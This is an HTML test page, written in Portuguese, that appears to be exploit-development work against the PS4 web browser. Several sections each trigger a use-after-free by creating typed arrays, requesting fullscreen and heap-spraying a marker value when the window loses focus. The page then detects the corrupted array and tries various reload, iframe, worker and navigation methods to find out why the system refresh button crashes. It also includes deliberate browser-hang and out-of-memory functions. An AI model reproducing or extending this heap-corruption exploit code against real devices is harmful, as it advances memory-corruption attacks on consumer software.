<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Reverse Engineering ATUALIZAR Button</title>
</head>
<body>

<h1>PS4 UAF - Mapeando Botão ATUALIZAR</h1>

<h2>DESCOBERTA</h2>
<p style="color:red;font-weight:bold;">location.reload() NÃO CRASHA mas botão ATUALIZAR CRASHA!</p>
<p>Isso significa que o botão ATUALIZAR faz algo DIFERENTE do reload normal.</p>

<hr>

<h2>TESTE 1: Hard Navigation vs Soft Reload</h2>
<p>Testa diferentes tipos de navegação</p>
<button onclick="runNavTest1()">EXECUTAR TESTE 1</button>
<div id="result1"></div>

<script>
function runNavTest1() {
    const result = document.getElementById('result1');
    result.innerHTML = '<h3>TESTE 1: Navigation Types</h3>';
    result.innerHTML += '<p>Aperte OPTIONS para UAF</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                window.globalCorrupted = corrupted;
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF ATIVO - Escolha um tipo de reload:</h3>';
        
        result.innerHTML += '<button onclick="testSoftReload()">1. Soft Reload (location.reload())</button><br>';
        result.innerHTML += '<button onclick="testHardReload()">2. Hard Reload (location.reload(true))</button><br>';
        result.innerHTML += '<button onclick="testReassign()">3. Reassign (location = location)</button><br>';
        result.innerHTML += '<button onclick="testHref()">4. Href Reload (location.href = location.href)</button><br>';
        result.innerHTML += '<button onclick="testReplace()">5. Replace (location.replace(location.href))</button><br>';
        result.innerHTML += '<button onclick="testHistoryGo()">6. History.go(0)</button><br>';
        result.innerHTML += '<button onclick="testWindowOpen()">7. window.open self</button><br>';
        
        result.innerHTML += '<p style="color:yellow;">Depois de testar JS, use botão ATUALIZAR para comparar</p>';
    };
}

function testSoftReload() {
    console.log('Testing: location.reload()');
    location.reload();
}

function testHardReload() {
    console.log('Testing: location.reload(true)');
    location.reload(true);
}

function testReassign() {
    console.log('Testing: location = location');
    location = location;
}

function testHref() {
    console.log('Testing: location.href = location.href');
    location.href = location.href;
}

function testReplace() {
    console.log('Testing: location.replace()');
    location.replace(location.href);
}

function testHistoryGo() {
    console.log('Testing: history.go(0)');
    history.go(0);
}

function testWindowOpen() {
    console.log('Testing: window.open');
    window.open(location.href, '_self');
}
</script>

<hr>

<h2>TESTE 2: Iframe Isolation Test</h2>
<p>Usa iframe para isolar UAF e testar destruição</p>
<button onclick="runIframeTest()">EXECUTAR TESTE 2</button>
<div id="result2"></div>
<div id="iframe-container"></div>

<script>
function runIframeTest() {
    const result = document.getElementById('result2');
    const container = document.getElementById('iframe-container');
    
    result.innerHTML = '<h3>TESTE 2: Iframe Isolation</h3>';
    result.innerHTML += '<p>Criando iframe com UAF isolado...</p>';
    
    // Criar iframe
    const iframe = document.createElement('iframe');
    iframe.style.width = '100%';
    iframe.style.height = '400px';
    iframe.style.border = '2px solid green';
    
    container.innerHTML = '';
    container.appendChild(iframe);
    
    // Código que roda DENTRO do iframe
    const iframeCode = `
        <!DOCTYPE html>
        <html>
        <head><title>Iframe UAF</title></head>
        <body>
        <h3>Iframe UAF Test</h3>
        <p>Aperte OPTIONS para trigger</p>
        <div id="iframe-result"></div>
        
        <script>
            const result = document.getElementById('iframe-result');
            let controllers = [];
            const PATTERN = 2.121995791e-314;
            
            for(let i = 0; i < 3000; i++) {
                let ctrl = new Float64Array(8);
                ctrl[0] = i;
                controllers.push(ctrl);
            }
            
            result.innerHTML = '<p>Controllers criados no iframe</p>';
            
            const doc = document.documentElement;
            if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
            
            window.onblur = function() {
                result.innerHTML += '<p>Blur no iframe!</p>';
                
                let spray = [];
                for(let i = 0; i < 5000; i++) {
                    let p = new Float64Array(10);
                    p.fill(PATTERN);
                    spray.push(p);
                }
                
                let corrupted = null;
                for(let i = 0; i < controllers.length; i++) {
                    if (controllers[i][0] === PATTERN) {
                        corrupted = controllers[i];
                        window.iframeCorrupted = corrupted;
                        parent.iframeCorrupted = corrupted;
                        break;
                    }
                }
                
                if (corrupted) {
                    result.innerHTML += '<p style="color:green;">UAF ATIVO NO IFRAME!</p>';
                    result.innerHTML += '<p>Array corrompido guardado em window.iframeCorrupted</p>';
                    parent.postMessage({type: 'uaf-success', data: 'UAF ativo'}, '*');
                } else {
                    result.innerHTML += '<p>UAF falhou</p>';
                    parent.postMessage({type: 'uaf-fail'}, '*');
                }
            };
        <\/script>
        </body>
        </html>
    `;
    
    iframe.srcdoc = iframeCode;
    
    // Escutar mensagens do iframe
    window.addEventListener('message', function(e) {
        if (e.data.type === 'uaf-success') {
            result.innerHTML += '<p style="color:green;">Iframe reportou UAF ativo!</p>';
            result.innerHTML += '<h4>Opções de teste:</h4>';
            result.innerHTML += '<button onclick="destroyIframe()">1. Remover Iframe (removeChild)</button><br>';
            result.innerHTML += '<button onclick="clearIframeSrc()">2. Limpar src (iframe.src="")</button><br>';
            result.innerHTML += '<button onclick="reloadIframe()">3. Reload iframe (contentWindow.location.reload())</button><br>';
            result.innerHTML += '<button onclick="replaceIframeContent()">4. Substituir HTML</button><br>';
            result.innerHTML += '<button onclick="testParentReload()">5. Reload página PAI (location.reload())</button><br>';
            result.innerHTML += '<p style="color:yellow;">Depois teste botão ATUALIZAR para comparar</p>';
        }
    });
}

function destroyIframe() {
    console.log('Destroying iframe...');
    const container = document.getElementById('iframe-container');
    container.innerHTML = '<p>Iframe removido</p>';
    document.getElementById('result2').innerHTML += '<p>Iframe destruído via removeChild</p>';
}

function clearIframeSrc() {
    console.log('Clearing iframe src...');
    const iframe = document.querySelector('iframe');
    if (iframe) {
        iframe.src = '';
        document.getElementById('result2').innerHTML += '<p>Iframe src limpo</p>';
    }
}

function reloadIframe() {
    console.log('Reloading iframe...');
    const iframe = document.querySelector('iframe');
    if (iframe && iframe.contentWindow) {
        iframe.contentWindow.location.reload();
        document.getElementById('result2').innerHTML += '<p>Iframe reloadado via contentWindow</p>';
    }
}

function replaceIframeContent() {
    console.log('Replacing iframe content...');
    const iframe = document.querySelector('iframe');
    if (iframe) {
        iframe.srcdoc = '<html><body><h1>Novo conteúdo</h1></body></html>';
        document.getElementById('result2').innerHTML += '<p>Conteúdo do iframe substituído</p>';
    }
}

function testParentReload() {
    console.log('Reloading parent...');
    location.reload();
}
</script>

<hr>

<h2>TESTE 3: Process/Worker Termination Simulation</h2>
<p>Tenta simular morte de processos</p>
<button onclick="runProcessTest()">EXECUTAR TESTE 3</button>
<div id="result3"></div>

<script>
function runProcessTest() {
    const result = document.getElementById('result3');
    result.innerHTML = '<h3>TESTE 3: Process Termination Simulation</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    // Criar Web Worker se possível
    let worker = null;
    try {
        const workerCode = `
            self.onmessage = function(e) {
                if (e.data === 'ping') {
                    self.postMessage('pong');
                }
            };
        `;
        const blob = new Blob([workerCode], {type: 'application/javascript'});
        const workerUrl = URL.createObjectURL(blob);
        worker = new Worker(workerUrl);
        result.innerHTML += '<p>Web Worker criado</p>';
    } catch(e) {
        result.innerHTML += '<p>Web Worker não disponível: ' + e.message + '</p>';
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF ATIVO</h3>';
        result.innerHTML += '<h4>Testes de terminação:</h4>';
        
        result.innerHTML += '<button onclick="killWorker()">1. Terminar Worker (worker.terminate())</button><br>';
        result.innerHTML += '<button onclick="abortAll()">2. Abortar tudo e reload</button><br>';
        result.innerHTML += '<button onclick="throwError()">3. Throw error fatal</button><br>';
        result.innerHTML += '<button onclick="infiniteLoop()">4. Loop infinito (força kill)</button><br>';
        result.innerHTML += '<button onclick="massiveAlloc()">5. Alocação massiva (OOM)</button><br>';
        
        window.workerInstance = worker;
        window.corruptedGlobal = corrupted;
    };
}

function killWorker() {
    console.log('Terminating worker...');
    if (window.workerInstance) {
        window.workerInstance.terminate();
        document.getElementById('result3').innerHTML += '<p>Worker terminado</p>';
    }
    setTimeout(() => location.reload(), 2000);
}

function abortAll() {
    console.log('Aborting everything...');
    window.stop();
    setTimeout(() => location.reload(), 1000);
}

function throwError() {
    console.log('Throwing fatal error...');
    throw new Error('FATAL ERROR TO SIMULATE CRASH');
}

function infiniteLoop() {
    console.log('Starting infinite loop...');
    document.getElementById('result3').innerHTML += '<p style="color:red;">Loop infinito iniciado - navegador deve travar</p>';
    while(true) {
        // Loop infinito
    }
}

function massiveAlloc() {
    console.log('Massive allocation...');
    document.getElementById('result3').innerHTML += '<p>Alocando memória massiva...</p>';
    let massive = [];
    try {
        for(let i = 0; i < 100000; i++) {
            massive.push(new ArrayBuffer(1024 * 1024)); // 1MB cada
        }
    } catch(e) {
        document.getElementById('result3').innerHTML += '<p>OOM: ' + e.message + '</p>';
    }
    setTimeout(() => location.reload(), 2000);
}
</script>

<hr>

<h2>TESTE 4: Cache e Context Manipulation</h2>
<p>Tenta limpar caches e forçar nova context</p>
<button onclick="runCacheTest()">EXECUTAR TESTE 4</button>
<div id="result4"></div>

<script>
function runCacheTest() {
    const result = document.getElementById('result4');
    result.innerHTML = '<h3>TESTE 4: Cache/Context Test</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF ATIVO</h3>';
        result.innerHTML += '<h4>Testes de cache/context:</h4>';
        
        result.innerHTML += '<button onclick="testNavigateBack()">1. Navigate back then forward</button><br>';
        result.innerHTML += '<button onclick="testClearHistory()">2. Clear history and reload</button><br>';
        result.innerHTML += '<button onclick="testHashChange()">3. Hash change navigation</button><br>';
        result.innerHTML += '<button onclick="testNewWindow()">4. Open new window then close this</button><br>';
        result.innerHTML += '<button onclick="testForceNewContext()">5. Force new context via navigation</button><br>';
        
        window.corruptedArray = corrupted;
    };
}

function testNavigateBack() {
    console.log('Navigate back/forward...');
    history.back();
    setTimeout(() => history.forward(), 1000);
}

function testClearHistory() {
    console.log('Clear history...');
    history.pushState(null, '', location.href);
    location.reload();
}

function testHashChange() {
    console.log('Hash change...');
    location.hash = '#test';
    setTimeout(() => {
        location.hash = '';
        location.reload();
    }, 1000);
}

function testNewWindow() {
    console.log('New window...');
    window.open('about:blank', '_blank');
    setTimeout(() => window.close(), 2000);
}

function testForceNewContext() {
    console.log('Force new context...');
    window.open(location.href, '_self', 'noopener,noreferrer');
}
</script>

<hr>

<h2>TESTE 5: Interceptar Eventos do Sistema</h2>
<p>Monitora eventos que o botão ATUALIZAR pode disparar</p>
<button onclick="runEventTest()">EXECUTAR TESTE 5</button>
<div id="result5"></div>

<script>
function runEventTest() {
    const result = document.getElementById('result5');
    result.innerHTML = '<h3>TESTE 5: System Events Monitor</h3>';
    result.innerHTML += '<p>Instalando listeners...</p>';
    
    const allEvents = [
        'beforeunload', 'unload', 'pagehide', 'pageshow',
        'visibilitychange', 'freeze', 'resume', 
        'focus', 'blur', 'load', 'DOMContentLoaded',
        'readystatechange', 'hashchange', 'popstate',
        'online', 'offline', 'storage', 'message',
        'error', 'abort'
    ];
    
    let eventLog = [];
    
    allEvents.forEach(evt => {
        const handler = (e) => {
            const entry = {
                time: Date.now(),
                event: evt,
                target: e.target ? e.target.nodeName : 'unknown'
            };
            eventLog.push(entry);
            console.log('[EVENT]', evt);
            result.innerHTML += '<p>[' + evt + '] triggered</p>';
        };
        
        window.addEventListener(evt, handler, true);
        document.addEventListener(evt, handler, true);
    });
    
    result.innerHTML += '<p>Listeners instalados para ' + allEvents.length + ' eventos</p>';
    result.innerHTML += '<p>Aperte OPTIONS para UAF</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF ATIVO - Monitorando eventos</h3>';
        result.innerHTML += '<p style="color:yellow;">AGORA: Use diferentes métodos de reload:</p>';
        result.innerHTML += '<button onclick="location.reload()">location.reload()</button>';
        result.innerHTML += '<button onclick="location.reload(true)">location.reload(true)</button>';
        result.innerHTML += '<p style="color:yellow;">Depois use botão ATUALIZAR e compare eventos</p>';
        
        window.getEventLog = () => eventLog;
    };
}
</script>

<hr>

<h2>ANÁLISE COMPARATIVA</h2>

<h3>O Que Descobrimos:</h3>
<p><b>FATO:</b> location.reload() NÃO crasha</p>
<p><b>FATO:</b> Botão ATUALIZAR CRASHA</p>

<h3>Hipóteses:</h3>
<ol>
<li><b>Hard Navigation:</b> Botão faz navegação completa (location.replace com cache clear)</li>
<li><b>Process Kill:</b> Botão mata processo do renderer brutalmente</li>
<li><b>Context Destruction:</b> Botão destroi contexto JavaScript de forma diferente</li>
<li><b>Cache Clear:</b> Botão limpa cache antes de recarregar</li>
<li><b>Iframe Kill:</b> Se em iframe, mata o iframe pai</li>
</ol>

<h3>Como Identificar:</h3>
<table border="1">
<tr>
<th>Teste</th>
<th>Se Crashar</th>
<th>Significa</th>
</tr>
<tr>
<td>TESTE 1: location.reload(true)</td>
<td>Crasha</td>
<td>Hard reload é o problema</td>
</tr>
<tr>
<td>TESTE 2: Iframe removal</td>
<td>Crasha</td>
<td>Destruição de contexto é o problema</td>
</tr>
<tr>
<td>TESTE 3: Worker terminate</td>
<td>Crasha</td>
<td>Terminação de processo é o problema</td>
</tr>
<tr>
<td>TESTE 5: Eventos diferentes</td>
<td>Eventos extras</td>
<td>Botão dispara eventos especiais</td>
</tr>
</table>

<hr>

<h2>PRÓXIMOS PASSOS</h2>

<p><b>CRÍTICO:</b> Execute cada teste do TESTE 1 e veja qual CRASHA:</p>
<ol>
<li>Soft Reload - NÃO crasha (já sabemos)</li>
<li>Hard Reload - ?</li>
<li>Reassign - ?</li>
<li>Href - ?</li>
<li>Replace - ?</li>
<li>History.go - ?</li>
<li>Window.open - ?</li>
</ol>

<p>Depois compare com botão ATUALIZAR</p>

<p><b>Se achar qual método CRASHA:</b> Sabemos como replicar o botão!</p>
<p><b>Se nenhum crashar:</b> Botão faz algo especial do sistema</p>

</body>
</html>
